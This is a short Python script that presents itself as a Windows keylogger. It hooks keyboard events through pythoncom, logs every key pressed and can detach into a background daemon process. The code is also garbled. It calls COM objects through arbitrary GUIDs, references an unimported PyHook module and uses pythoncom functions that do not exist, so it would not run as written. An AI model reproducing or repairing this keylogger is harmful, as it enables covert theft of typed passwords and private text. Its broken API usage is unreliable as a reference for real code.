import pythoncom
import threading
import sys
import logging
from multiprocessing import Process

# Set up logging
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Function to handle the keyboard event
def OnKeyboardEvent(event):
    logging.info("Keylog event: %s" % event.KeyID)

# Set up the keyboard event handler
def start_keylog():
    hm = pythoncom.CoCreateInstance(pythoncom.GUID("{8B52F282-4E60-101B-A2BC-00AA004A5664}"), pythoncom.GUID("{00000016-0000-0000-C000-000000000046}"))
    hm.HookKeyboard()

    # Get the thread ID of the current thread
    thread_id = pythoncom.CoGetCurrentThreadId()

    # Create a new thread for handling the keyboard event
    threading.Thread(target=PyHook.HookManager.KeyDown, args=(OnKeyboardEvent, )).start()

    # Start the message loop
    pythoncom.PumpMessages()

    # Unhook the keyboard event
    hm.UnhookKeyboard()

if __name__ == '__main__':
    if len(sys.argv) > 1 and sys.argv[1] == '-d':
        start_keylog()
    else:
        p = Process(target=start_keylog)
        p.daemon = True
        p.start()
